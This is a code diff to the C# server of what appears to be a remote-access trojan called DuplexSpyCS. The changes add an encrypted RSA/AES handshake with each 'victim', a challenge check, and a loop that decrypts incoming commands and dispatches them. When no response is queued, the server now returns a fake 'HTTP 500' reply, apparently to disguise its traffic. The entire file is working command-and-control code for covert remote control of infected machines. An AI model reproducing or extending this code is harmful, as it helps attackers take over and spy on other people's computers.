@@ -115,10 +115,6 @@ namespace DuplexSpyCS
             }
         }
 
-        public void fnEnqueue(byte[] abBuffer)
-        {
-
-        }
         public void fnEnqueue(clsHttpResp resp)
         {
             m_qResponse.Enqueue(resp);
@@ -128,7 +124,7 @@ namespace DuplexSpyCS
         {
             if (m_qResponse.Count == 0)
             {
-                return new clsHttpResp(clsCrypto.b64E2Str(clsEZData.fnGenerateRandomStr()));
+                return new clsHttpResp(3, 0, "HTTP 500://Server internal error.");
             }
             else
             {
@@ -169,17 +165,22 @@ namespace DuplexSpyCS
                 string szRsaPublicKey = s[0];
                 string szRsaPrivateKey = s[1];
 
+                victim.key_pairs = (szRsaPublicKey, szRsaPrivateKey);
+
                 victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
 
-                var (header, bodyBytes) = await fnReadHttpPacket(stream);
-                if (bodyBytes.Length == 0)
-                    return;
-
-                string szBody = Encoding.UTF8.GetString(bodyBytes);
                 while (m_bIslistening)
                 {
                     try
                     {
+                        if (!client.Connected)
+                            break;
+
+                        var (header, bodyBytes) = await fnReadHttpPacket(stream);
+                        if (bodyBytes.Length == 0)
+                            return;
+
+                        string szBody = Encoding.UTF8.GetString(bodyBytes);
                         byte[] abBody = Convert.FromBase64String(szBody);
                         if (abBody.Length == 0)
                             continue;
@@ -191,13 +192,78 @@ namespace DuplexSpyCS
                         int nParam = headerInfo.para;
                         byte[] abMsg = dsp.GetMsg().msg;
 
-                        MessageBox.Show(nCmd.ToString());
+                        if (nCmd == 0)
+                        {
+                            if (nParam == 0)
+                            {
+                                //todo: disconnect
+                            }
+                        }
+                        else if (nCmd == 1)
+                        {
+                            if (nParam == 1)
+                            {
+                                byte[] abEncAesData = Convert.FromBase64String(Encoding.UTF8.GetString(abMsg));
+                                byte[] abPlainData = clsCrypto.RSADecrypt(abEncAesData, victim.key_pairs.private_key);
+                                string szPlainData = Encoding.UTF8.GetString(abPlainData);
+
+                                string[] asAesData = szPlainData.Split('|');
+
+                                byte[] abKey = Convert.FromBase64String(asAesData.First());
+                                byte[] abIV = Convert.FromBase64String(asAesData.Last());
+
+                                victim._AES.key = abKey;
+                                victim._AES.iv = abIV;
+
+                                string szChallenge = clsEZData.fnGenerateRandomStr();
+                                victim.challenge_text = szChallenge;
+
+                                string szCipher = clsCrypto.AESEncrypt(szChallenge, abKey, abIV);
+                                victim.Send(new clsHttpResp(1, 2, szCipher).fnGetBytes());
+                            }
+                            else if (nParam == 3)
+                            {
+                                string enc_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abMsg)), victim._AES.key, victim._AES.iv);
+                                string payload = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(Convert.FromBase64String(enc_data), victim.key_pairs.private_key));
+
+                                if (string.Equals(payload, victim.challenge_text))
+                                {
+                                    victim.Send(new clsHttpResp(1, 4, clsEZData.fnGenerateRandomStr()).fnGetBytes());
+                                }
+                            }
+                        }
+                        else if (nCmd == 2)
+                        {
+                            if (nParam == 0)
+                            {
+                                string dec_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abMsg)), victim._AES.key, victim._AES.iv);
+                                string[] cmd = dec_data.Split("|");
+
+                                try
+                                {
+                                    fnReceivedDecoded(this, victim, cmd.ToList());
+                                }
+                                catch (InvalidOperationException)
+                                {
+
+                                }
+
+                                var pkt = fnGetResponse();
+                                victim.Send(pkt.fnGetBytes());
+                            }
+                        }
+                    }
+                    catch (ObjectDisposedException)
+                    {
+                        break;
                     }
                     catch (Exception ex)
                     {
-
+                        //MessageBox.Show(ex.Message);
                     }
                 }
+
+                fnDisconnected(victim);
             }
         }
 
